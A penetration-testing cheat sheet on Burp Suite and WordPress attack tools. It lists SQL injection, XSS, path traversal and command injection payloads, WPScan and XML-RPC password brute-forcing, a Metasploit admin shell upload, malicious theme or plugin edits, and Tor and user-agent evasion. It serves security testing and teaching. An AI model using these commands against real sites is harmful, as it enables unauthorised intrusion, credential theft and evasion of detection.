# Web Security Tools & Scanners

Covers Burp Suite and WordPress penetration testing tools.

## Burp Suite

### Setup
- Default proxy: `127.0.0.1:8080`
- Install CA cert for HTTPS: navigate to `http://burp`
- Use Burp's embedded browser for reliable interception

### Edition Comparison

| Feature | Community | Professional |
|---------|-----------|-------------|
| Proxy | Yes | Yes |
| Repeater | Yes | Yes |
| Intruder | Limited | Full |
| Scanner | No | Yes |
| Extensions | Yes | Yes |

### Core Workflow

#### Proxy - Intercept & Modify
1. Enable "Intercept on"
2. Navigate in browser → request captured
3. Modify parameters (price, userId, quantity, hidden fields)
4. Forward to server

#### Repeater - Manual Testing
```
1. Send request to Repeater (Ctrl+R)
2. Modify parameter values
3. Click Send
4. Analyze response
5. Iterate with different payloads:
   productId=1, productId=999, productId=', productId=1 OR 1=1
```

#### Intruder - Automated Attacks

| Attack Type | Description | Use Case |
|-------------|-------------|----------|
| Sniper | Single position, iterate payloads | Fuzzing one parameter |
| Battering ram | Same payload all positions | Credential testing |
| Pitchfork | Parallel payload iteration | Username:password pairs |
| Cluster bomb | All combinations | Full brute force |

#### Scanner (Professional)

| Mode | Duration |
|------|----------|
| Lightweight | ~15 minutes |
| Fast | ~30 minutes |
| Balanced | ~1-2 hours |
| Deep | Several hours |

### Target Scope
1. Target > Site map > right-click host > Add to scope
2. Filter HTTP history: "Show only in-scope items"
3. Prevents accidental out-of-scope testing

### Keyboard Shortcuts

| Action | Windows/Linux |
|--------|---------------|
| Forward request | Ctrl+F |
| Drop request | Ctrl+D |
| Send to Repeater | Ctrl+R |
| Send to Intruder | Ctrl+I |
| Toggle intercept | Ctrl+T |

### Common Test Payloads
```
# SQLi:  ' OR '1'='1  |  1 UNION SELECT NULL--
# XSS:   <script>alert(1)</script>  |  "><img src=x onerror=alert(1)>
# Path Traversal:  ../../../etc/passwd
# Command Injection:  ; ls -la  |  `whoami`
```

## WordPress Penetration Testing

### WordPress Discovery
```bash
curl -s http://target.com | grep -i "wp-content"
curl -I http://target.com/wp-login.php
curl -I http://target.com/xmlrpc.php
nmap -p 80,443 --script http-wordpress-enum target.com
```

### Key WordPress Paths

| Path | Purpose |
|------|---------|
| `/wp-admin/` | Admin dashboard |
| `/wp-login.php` | Login page |
| `/wp-content/uploads/` | User uploads |
| `/xmlrpc.php` | XML-RPC API |
| `/wp-json/` | REST API |
| `/readme.html` | Version info |

### WPScan Commands

```bash
# Basic scan
wpscan --url http://target.com

# Full enumeration
wpscan --url http://target.com -e at,ap,u,cb,dbe --detection-mode aggressive

# Password attack
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt

# XML-RPC brute force (faster, may bypass protection)
wpscan --url http://target.com -U admin -P passwords.txt --password-attack xmlrpc
```

### WPScan Enumeration Flags

| Flag | Description |
|------|-------------|
| `-e at` | All themes |
| `-e vt` | Vulnerable themes |
| `-e ap` | All plugins |
| `-e vp` | Vulnerable plugins |
| `-e u` | Users (1-10) |
| `-e cb` | Config backups |
| `-e dbe` | Database exports |

### User Enumeration
```bash
# Author ID enumeration
for i in {1..20}; do curl -s "http://target.com/?author=$i" | grep -o 'author/[^/]*/'; done

# REST API
curl -s http://target.com/wp-json/wp/v2/users
```

### Post-Exploitation (with credentials)

```bash
# Metasploit shell upload
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD password
exploit

# Manual: Edit theme 404.php via Appearance > Theme Editor
# Or upload malicious plugin as ZIP
```

### XML-RPC Exploitation
```bash
# Check if enabled
curl -X POST http://target.com/xmlrpc.php

# List methods
curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://target.com/xmlrpc.php

# Multicall brute force (multiple passwords per request)
```

### Evasion
```bash
wpscan --url http://target.com --random-user-agent --throttle 1000
wpscan --url http://target.com --proxy socks5://127.0.0.1:9050  # Tor
```
